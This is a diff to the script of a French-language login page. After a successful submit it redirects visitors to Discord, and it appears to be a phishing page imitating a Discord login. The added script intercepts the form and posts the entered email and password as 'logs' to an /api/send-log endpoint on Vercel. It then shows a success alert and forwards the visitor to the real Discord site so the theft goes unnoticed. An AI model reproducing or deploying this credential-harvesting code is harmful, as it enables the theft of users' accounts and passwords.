@@ -31,34 +31,34 @@
         <p>Besoin d'un compte ? <a href="#">S'inscrire</a></p>
     </div>
 
-    <script>
-        document.getElementById("loginForm").addEventListener("submit", function(event) {
-            event.preventDefault(); // Empêche le rechargement de la page
-            
-            let email = document.getElementById("email").value;
-            let password = document.getElementById("password").value;
-            
-            // Envoi des données à l'API sur Vercel
-            fetch("send-log.js", {
+   <script>
+    document.getElementById("loginForm").addEventListener("submit", function(event) {
+        event.preventDefault(); // Empêche le rechargement de la page
 
-                method: "POST",
-                headers: {
-                    "Content-Type": "application/json"
-                },
-                body: JSON.stringify({ email: email, password: password })
-            })
-            .then(response => response.json())
-            .then(data => {
-                console.log(data); // Vérifie la réponse dans la console
-                alert("Log envoyé avec succès !");
-                window.location.href = "https://discord.com/channels/@me"; // Redirection après succès
-            })
-            .catch(error => {
-                console.error("Erreur :", error);
-                alert("Une erreur est survenue lors de l'envoi des logs.");
-            });
+        let email = document.getElementById("email").value;
+        let password = document.getElementById("password").value;
+
+        // Envoie des données à l'API sur Vercel
+        fetch("/api/send-log", {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify({ email: email, password: password })
+        })
+        .then(response => response.json())
+        .then(data => {
+            console.log(data); // Affiche la réponse du serveur
+            alert("Log envoyé avec succès !");
+            window.location.href = "https://discord.com/channels/@me"; // Redirection après succès
+        })
+        .catch(error => {
+            console.error("Erreur :", error);
+            alert("Une erreur est survenue lors de l'envoi des logs.");
         });
-    </script>
+    });
+</script>
+
 </body>
 </html>
 
